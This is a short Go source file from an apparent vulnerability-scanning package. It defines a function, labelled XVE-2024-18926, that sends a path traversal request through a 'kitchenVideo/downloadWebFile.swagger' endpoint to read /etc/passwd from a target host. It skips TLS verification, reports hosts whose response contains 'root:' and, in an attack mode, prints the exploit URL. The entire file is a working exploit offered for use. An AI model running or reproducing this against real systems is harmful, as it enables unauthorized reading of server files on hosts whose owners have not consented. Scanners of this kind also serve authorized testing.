package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func XVE_2024_18926(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if response.StatusCode == 200 && strings.Contains(string(body), "root:") {
		fmt.Println("[*]XVE-2024-18926 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
